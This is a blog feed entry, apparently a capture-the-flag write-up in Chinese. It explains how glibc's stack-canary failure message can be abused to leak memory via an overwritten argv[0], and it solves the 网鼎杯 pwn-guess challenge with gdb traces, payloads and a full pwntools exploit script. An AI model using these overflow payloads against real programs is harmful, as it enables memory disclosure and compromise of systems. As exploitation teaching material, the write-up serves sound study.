    <link href="https://nocbtm.github.io/2020/04/28/stack-chk-fail%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/28/stack-chk-fail相关利用/</id>
    <published>2020-04-28T03:27:57.000Z</published>
    <updated>2020-04-29T16:16:56.202Z</updated>
    
    <content type="html"><![CDATA[<p>在 Linux 系统应用程序中部署 Canary 漏洞缓解机制可有效防御栈溢出漏洞的攻击，然而在一定环境下，攻击者可利用该机制泄露内存信息，实现进一步的攻击。</p><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><h2 id="1-Stack-smash"><a href="#1-Stack-smash" class="headerlink" title="1. Stack smash"></a>1. Stack smash</h2><p>Linux 系统中，为了防御栈溢出漏洞的利用，通常会部署 Canary 漏洞缓解措施。Wiki 中对 Canary 的解释如下：</p><blockquote><p>Canaries or canary words are known values that are placed between a buffer and control data on the stack to monitor buffer overflows. When the buffer overflows, the first data to be corrupted will usually be the canary, and a failed verification of the canary data will therefore alert of an overflow, which can then be handled, for example, by invalidating the corrupted data.</p></blockquote><p>下面简单描述下 Canary 的原理。对于栈溢出漏洞的利用，最简单的方法就是通过溢出数据修改栈中函数返回地址为目标内存地址，当函数返回时将会跳转到目标内存处执行指令，从而实现控制流劫持。为了防御这种利用方法，分配栈空间时在 EBP-4 的位置存放一个 Canary 值，函数返回之前会校验该值是否被修改，若检测到被修改则调用 <code>__stack_chk_fail</code> 函数抛出异常并结束进程。可见，要覆盖函数返回地址必须修改 Canary，从而可防御该攻击方法。gcc 编译器默认开启该缓解机制，编译时可用 <code>-fno-stack-protector</code> 选项关闭该机制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> Low Address |                 |</span><br><span class="line">             +-----------------+</span><br><span class="line">     esp =&gt;  | local variables |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |    buf[0-3]     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |    buf[4-7]     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     canary      |</span><br><span class="line">             +-----------------+</span><br><span class="line">     ebp =&gt;  |     old ebp     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |   return addr   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |      args       |</span><br><span class="line">             +-----------------+</span><br><span class="line">High Address |                 |</span><br></pre></td></tr></table></figure><p>libc 中 <code>__stack_chk_fail</code> 的源码如下，该函数调用 <code>__fortify_fail</code> 输出异常信息，其中包含 libc_argv[0] 指向的程序名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminatedn&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若通过栈溢出漏洞可修改栈内存中 argv[0] 指针，那么触发 Stack smash 时可泄露内存信息。例如把 argv[0] 修改为 got 表项可泄露出内存中函数地址，为进一步利用提供条件。</p><h2 id="2-environ"><a href="#2-environ" class="headerlink" title="2. environ"></a>2. environ</h2><p>在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。从以下结果可知环境指针 environ 在栈空间的高地址处。因此，<strong>可通过 environ 指针泄露栈地址</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start              End                Perm      Name</span><br><span class="line">0x00400000         0x00401000         r-xp      /home/lc/Desktop/guess/guess</span><br><span class="line">0x00601000         0x00602000         r--p      /home/lc/Desktop/guess/guess</span><br><span class="line">0x00602000         0x00603000         rw-p      /home/lc/Desktop/guess/guess</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 ---p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 r--p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p      mapped</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fdb000 0x00007ffff7fde000 rw-p      mapped</span><br><span class="line">0x00007ffff7ff7000 0x00007ffff7ffa000 r--p      [vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp      [vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rw-p      mapped</span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]</span><br><span class="line">gdb-peda$ print environ</span><br><span class="line">$1 = (char **) 0x7fffffffdc98</span><br><span class="line">gdb-peda$ telescope 0x7fffffffdc98</span><br><span class="line">0000| 0x7fffffffdc98 --&gt; 0x7fffffffe0ae (&quot;XDG_SESSION_ID=c2&quot;)</span><br><span class="line">0008| 0x7fffffffdca0 --&gt; 0x7fffffffe0c0 (&quot;QT_LINUX_ACCESSIBILITY_ALWAYS_ON=1&quot;)</span><br><span class="line">0016| 0x7fffffffdca8 --&gt; 0x7fffffffe0e3 (&quot;UNITY_DEFAULT_PROFILE=unity&quot;)</span><br><span class="line">0024| 0x7fffffffdcb0 --&gt; 0x7fffffffe0ff (&quot;GNOME_KEYRING_PID=&quot;)</span><br><span class="line">0032| 0x7fffffffdcb8 --&gt; 0x7fffffffe112 (&quot;GNOME_KEYRING_CONTROL=&quot;)</span><br><span class="line">0040| 0x7fffffffdcc0 --&gt; 0x7fffffffe129 (&quot;DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path&quot;)</span><br><span class="line">0048| 0x7fffffffdcc8 --&gt; 0x7fffffffe15c (&quot;LOGNAME=lc&quot;)</span><br><span class="line">0056| 0x7fffffffdcd0 --&gt; 0x7fffffffe167 (&quot;INSTANCE=&quot;)</span><br></pre></td></tr></table></figure><h1 id="实例分析-网鼎杯-pwn-guess"><a href="#实例分析-网鼎杯-pwn-guess" class="headerlink" title="实例分析  网鼎杯 pwn-guess"></a>实例分析  网鼎杯 pwn-guess</h1><p>下面通过调试 <a href="https://github.com/0x4C43/Linux-Exploit/tree/master/stack_smash" target="_blank" rel="noopener">网鼎杯的 pwn-GUESS</a> 的利用过程说明 Stack smash 利用方法。</p><h2 id="1-漏洞位置"><a href="#1-漏洞位置" class="headerlink" title="1. 漏洞位置"></a>1. 漏洞位置</h2><p>程序首先将 flag 读入内存中的 buf，用户有 3 次猜测 flag 的机会。通过 gets() 读取用户输入时存在栈溢出漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  puts(&quot;This is GUESS FLAG CHALLENGE!&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;you have no sense... bye :-) &quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = sub_400A11();</span><br><span class="line">    if ( !v5 )</span><br><span class="line">      break;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Please type your guessing flag&quot;);</span><br><span class="line">  gets(&amp;s2);         // overflow</span><br><span class="line">  if ( !strcmp(&amp;buf, &amp;s2) )</span><br><span class="line">    puts(&quot;You must have great six sense!!!! :-o &quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;You should take more effort to get six sence, and one more challenge!!&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h2><p>首先查看程序开启的漏洞缓解机制，发现已开启 Canary 和 NX，未开启 PIE。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec </span><br><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure><p>由于程序中 sub_400A11() 函数使用 fork 子进程的方式允许用户有 3 次猜测 flag 的机会，同时又将 flag 读入栈中，因此可利用 Stack smash 进行 3 次内存泄漏获得 flag。具体利用思路如下：</p><ul><li>通过栈溢出漏洞覆盖 argv[0] 为 <code>__libc_start_main</code> 的 got 表项，触发 Stack smash 可泄露 <code>__libc_start_main</code> 函数地址，利用给出的 libc 文件可计算得到 libc 基地址；</li><li>计算出 environ 在内存中的地址，第二次利用栈溢出漏洞覆盖 argv[0] 为 <code>environ</code> ，泄露出 environ 的值，即指向环境变量的栈地址；</li><li>根据栈内存中 flag 与 environ 值的偏移量计算出 flag 的栈地址，再次利用栈溢出漏洞覆盖 argv[0] 为 flag 的栈地址，从而可读取 flag 的值。</li></ul><h3 id="1）泄露-libc-基址"><a href="#1）泄露-libc-基址" class="headerlink" title="1）泄露 libc 基址"></a>1）泄露 libc 基址</h3><p>首先，从下图栈内存信息可知缓冲区 s2 地址为 0x7fffffffdb60， argv[0] 地址为 0x7fffffffdc88，从而可计算出 s2 与 argv[0] 间的偏移量为 0x128（0x7fffffffdc88-0x7fffffffdb60）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x400b1b:    mov    rdi,rax</span><br><span class="line">   0x400b1e:    mov    eax,0x0</span><br><span class="line">   0x400b23:    call   0x400830 &lt;gets@plt&gt;</span><br><span class="line">=&gt; 0x400b28:    lea    rdx,[rbp-0x40]</span><br><span class="line">   0x400b2c:    lea    rax,[rbp-0x70]</span><br><span class="line">   0x400b30:    mov    rsi,rdx</span><br><span class="line">   0x400b33:    mov    rdi,rax</span><br><span class="line">   0x400b36:    call   0x400820 &lt;strcmp@plt&gt;</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x0000000000400b28 in ?? ()</span><br><span class="line">gdb-peda$ stack 20</span><br><span class="line">0000| 0x7fffffffdb00 --&gt; 0x7fffffffdc88 --&gt; 0x7fffffffe091 (&quot;/home/lc/Desktop/guess/guess&quot;)</span><br><span class="line">0008| 0x7fffffffdb08 --&gt; 0x100000000 </span><br><span class="line">0016| 0x7fffffffdb10 --&gt; 0x0 </span><br><span class="line">0024| 0x7fffffffdb18 --&gt; 0x3 </span><br><span class="line">0032| 0x7fffffffdb20 --&gt; 0x0 </span><br><span class="line">0040| 0x7fffffffdb28 --&gt; 0x3 </span><br><span class="line">0048| 0x7fffffffdb30 (&quot;flag&#123;43861991f7e943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">0056| 0x7fffffffdb38 (&quot;61991f7e943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">0064| 0x7fffffffdb40 (&quot;943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">0072| 0x7fffffffdb48 (&quot;57863eec75961&#125;\n&quot;)</span><br><span class="line">0080| 0x7fffffffdb50 --&gt; 0xa7d3136393537 (&apos;75961&#125;\n&apos;)</span><br><span class="line">0088| 0x7fffffffdb58 --&gt; 0x0 </span><br><span class="line">0096| 0x7fffffffdb60 (&apos;A&apos; &lt;repeats 16 times&gt;)</span><br><span class="line">0104| 0x7fffffffdb68 (&quot;AAAAAAAA&quot;)</span><br><span class="line">0112| 0x7fffffffdb70 --&gt; 0x0</span><br></pre></td></tr></table></figure><p>因此可构造以下 payload 将 argv[0] 覆盖为 <code>__libc_start_main</code> 的 got 表项，可泄露出 <code>__libc_start_main</code> 函数在内存中的地址，从而计算出 libc 的基址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;A&apos; * 0x128 + p64(libc_start_main_got)</span><br><span class="line">libc_base_addr = libc_start_main_addr - libc.symbols[&apos;__libc_start_main&apos;]</span><br></pre></td></tr></table></figure><p>泄露出 libc 基址为 0x7ffff7a0d000。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x7a bytes:</span><br><span class="line">    00000000  59 6f 75 20  73 68 6f 75  6c 64 20 74  61 6b 65 20  │You │shou│ld t│ake │</span><br><span class="line">    00000010  6d 6f 72 65  20 65 66 66  6f 72 74 20  74 6f 20 67  │more│ eff│ort │to g│</span><br><span class="line">    00000020  65 74 20 73  69 78 20 73  65 6e 63 65  2c 20 61 6e  │et s│ix s│ence│, an│</span><br><span class="line">    00000030  64 20 6f 6e  65 20 6d 6f  72 65 20 63  68 61 6c 6c  │d on│e mo│re c│hall│</span><br><span class="line">    00000040  65 6e 67 65  21 21 0a 2a  2a 2a 20 73  74 61 63 6b  │enge│!!·*│** s│tack│</span><br><span class="line">    00000050  20 73 6d 61  73 68 69 6e  67 20 64 65  74 65 63 74  │ sma│shin│g de│tect│</span><br><span class="line">    00000060  65 64 20 2a  2a 2a 3a 20  40 d7 a2 f7  ff 7f 20 74  │ed *│**: │@···│·· t│</span><br><span class="line">    00000070  65 72 6d 69  6e 61 74 65  64 0a                     │ermi│nate│d·│</span><br><span class="line">    0000007a</span><br><span class="line">libc_base_addr = 0x7ffff7a0d000</span><br></pre></td></tr></table></figure><h3 id="2）泄露-environ"><a href="#2）泄露-environ" class="headerlink" title="2）泄露 environ"></a>2）泄露 environ</h3><p>构造以下 payload，第二次利用栈溢出将 argv[0] 覆盖为 <code>environ</code> 的地址，从而泄露出 <code>environ</code> 的值，该值为执行环境变量的栈地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">environ_addr = libc_base_addr + libc.symbols[&apos;_environ&apos;]</span><br><span class="line">payload1 = &apos;A&apos; * 0x128 + p64(environ_addr)</span><br></pre></td></tr></table></figure><p>泄露出 <code>environ</code> 的值为 0x7fffffffdcf8。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x7a bytes:</span><br><span class="line">    00000000  59 6f 75 20  73 68 6f 75  6c 64 20 74  61 6b 65 20  │You │shou│ld t│ake │</span><br><span class="line">    00000010  6d 6f 72 65  20 65 66 66  6f 72 74 20  74 6f 20 67  │more│ eff│ort │to g│</span><br><span class="line">    00000020  65 74 20 73  69 78 20 73  65 6e 63 65  2c 20 61 6e  │et s│ix s│ence│, an│</span><br><span class="line">    00000030  64 20 6f 6e  65 20 6d 6f  72 65 20 63  68 61 6c 6c  │d on│e mo│re c│hall│</span><br><span class="line">    00000040  65 6e 67 65  21 21 0a 2a  2a 2a 20 73  74 61 63 6b  │enge│!!·*│** s│tack│</span><br><span class="line">    00000050  20 73 6d 61  73 68 69 6e  67 20 64 65  74 65 63 74  │ sma│shin│g de│tect│</span><br><span class="line">    00000060  65 64 20 2a  2a 2a 3a 20  f8 dc ff ff  ff 7f 20 74  │ed *│**: │····│·· t│</span><br><span class="line">    00000070  65 72 6d 69  6e 61 74 65  64 0a                     │ermi│nate│d·│</span><br><span class="line">    0000007a</span><br><span class="line">stack_addr = 0x7fffffffdcf8</span><br></pre></td></tr></table></figure><p>可在 gdb 中验证该值为正确的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ print environ</span><br><span class="line">$1 = (char **) 0x7fffffffdcf8</span><br><span class="line">gdb-peda$ telescope 0x7fffffffdcf8</span><br><span class="line">0000| 0x7fffffffdcf8 --&gt; 0x7fffffffe0ea (&quot;INSTANCE=&quot;)</span><br><span class="line">0008| 0x7fffffffdd00 --&gt; 0x7fffffffe0f4 (&quot;MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path&quot;)</span><br><span class="line">0016| 0x7fffffffdd08 --&gt; 0x7fffffffe12a (&quot;ALL_PROXY=socks://192.168.239.1:1080/&quot;)</span><br><span class="line">       ...</span><br></pre></td></tr></table></figure><h3 id="3）读取-flag"><a href="#3）读取-flag" class="headerlink" title="3）读取 flag"></a>3）读取 flag</h3><p>查看内存中 flag 的地址为 0x7fffffffdb90，计算该地址与泄露栈地址的偏移量为 0x168（0x7fffffffdcf8 - 0x7fffffffdb90）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack 20                                                                                                                                             </span><br><span class="line">0000| 0x7fffffffdb08 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;:  cmp    rax,0x0)</span><br><span class="line">0008| 0x7fffffffdb10 --&gt; 0x7ffff7dd3780 --&gt; 0x0 </span><br><span class="line">     ...</span><br><span class="line">0088| 0x7fffffffdb60 --&gt; 0x7fffffffdce8 --&gt; 0x7fffffffe0e2 --&gt; 0x73736575672f2e (&apos;./guess&apos;)</span><br><span class="line">0096| 0x7fffffffdb68 --&gt; 0x100000000 </span><br><span class="line">0104| 0x7fffffffdb70 --&gt; 0x8600000000 </span><br><span class="line">0112| 0x7fffffffdb78 --&gt; 0x3 </span><br><span class="line">0120| 0x7fffffffdb80 --&gt; 0x2 </span><br><span class="line">0128| 0x7fffffffdb88 --&gt; 0x3 </span><br><span class="line">0136| 0x7fffffffdb90 (&quot;flag&#123;43861991f7e943090e257863eec75961&#125;\n&quot;)</span><br><span class="line">     ...</span><br></pre></td></tr></table></figure><p>构造以下 payload，第三次利用栈溢出覆盖 argv[0] 为 flag 的内存地址，从而可读取内存中的 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2 = &apos;A&apos; * 0x128 + p64(stack_addr - 0x168)</span><br></pre></td></tr></table></figure><p>最终获取 flag 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x9b bytes:</span><br><span class="line">    &apos;You should take more effort to get six sence, and one more challenge!!\n&apos;</span><br><span class="line">    &apos;*** stack smashing detected ***: flag&#123;43861991f7e943090e257863eec75961&#125;\n&apos;</span><br><span class="line">    &apos; terminated\n&apos;</span><br><span class="line">You should take more effort to get six sence, and one more challenge!!</span><br><span class="line">*** stack smashing detected ***: flag&#123;43861991f7e943090e257863eec75961&#125;</span><br><span class="line"> terminated</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./guess'</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main_got = <span class="number">0x602048</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x400B23)    </span></span><br><span class="line"><span class="comment">#raw_input("leak libc_base")</span></span><br><span class="line">p.recvuntil(<span class="string">'guessing flag\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(libc_start_main_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'detected ***: '</span>)</span><br><span class="line">libc_start_main_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base_addr = libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base_addr = '</span> + hex(libc_base_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input("leak environ_addr")</span></span><br><span class="line">environ_addr = libc_base_addr + libc.symbols[<span class="string">'_environ'</span>]</span><br><span class="line">payload1 = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(environ_addr)</span><br><span class="line">p.recvuntil(<span class="string">'Please type your guessing flag'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'stack smashing detected ***: '</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'stack_addr = '</span> + hex(stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input("leak flag")</span></span><br><span class="line">payload2 = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(stack_addr - <span class="number">0x168</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please type your guessing flag'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'&#125;'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>References:</p><p><a href="http://0x4c43.cn/2018/1013/stack-overflow-smash-utilization/" target="_blank" rel="noopener">栈溢出 Stack smash 利用</a></p><p><a href="https://www.anquanke.com/post/id/161142#h2-0" target="_blank" rel="noopener">浅析ROP之Stack Smash</a></p><p> <a href="http://tacxingxing.com/2017/12/16/environ/" target="_blank" rel="noopener">Environ</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在 Linux 系统应用程序中部署 Canary 漏洞缓解机制可有效防御栈溢出漏洞的攻击，然而在一定环境下，攻击者可利用该机制泄露内存信息，实现进一步的攻击。&lt;/p&gt;
&lt;h1 id=&quot;利用思路&quot;&gt;&lt;a href=&quot;#利用思路&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>__do_global_dtors_aux的gadget</title>
    <link href="https://nocbtm.github.io/2020/04/21/%C2%96do-global-dtors-aux%E7%9A%84gadget/"/>
    <id>https://nocbtm.github.io/2020/04/21/do-global-dtors-aux的gadget/</id>
    <published>2020-04-21T03:30:39.000Z</published>
    <updated>2020-04-28T16:49:57.831Z</updated>
    
